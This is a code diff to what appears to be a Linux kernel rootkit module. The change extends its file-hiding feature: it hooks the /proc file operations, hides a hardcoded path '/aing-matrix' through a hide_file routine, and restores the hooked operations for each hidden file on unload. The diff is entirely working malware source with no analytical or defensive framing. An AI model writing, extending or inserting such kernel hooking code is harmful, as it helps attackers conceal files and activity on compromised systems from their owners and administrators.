@@ -640,6 +640,7 @@ bool hide_file(const char* user_input, struct hidden_file* hf) {
     char* user_file = kmalloc(strlen(user_input) + 1, GFP_KERNEL);
     memset(user_file, 0, strlen(user_input));
 
+    j = 0;
     for (i = strlen(user_dir) - 1; i >= 0; --i) {
         if (user_dir[i] == '/') {
             break;
@@ -713,8 +714,12 @@ static int __init mod_init(void) {
     proc_fops.iterate_shared = rk_iterate_shared;
     proc_inode->i_fop = &proc_fops;
 
-#if 1
     const char* user_input = "/aing-matrix";
+    if (hide_file(user_input, hidden_files + hidden_file_count)) {
+        ++hidden_file_count;
+    }
+
+#if 0
     //const char *user_input = "/proc/stat";
 
     char* user_string = kmalloc(100, GFP_KERNEL);
@@ -837,8 +842,13 @@ static void __exit mod_exit(void) {
     proc_inode = proc_path.dentry->d_inode;
     proc_inode->i_fop = backup_proc_fops;
 
-    my_file_inode = my_file_path.dentry->d_inode;
-    my_file_inode->i_fop = backup_file_ops;
+    for (i = 0; i < hidden_file_count; ++i) {
+        hidden_files[i].inode = hidden_files[i].path.dentry->d_inode;
+        hidden_files[i].inode->i_fop = hidden_files[i].backup_fops;
+    }
+
+    //my_file_inode = my_file_path.dentry->d_inode;
+    //my_file_inode->i_fop = backup_file_ops;
 
 #if 0
     if (svc) {
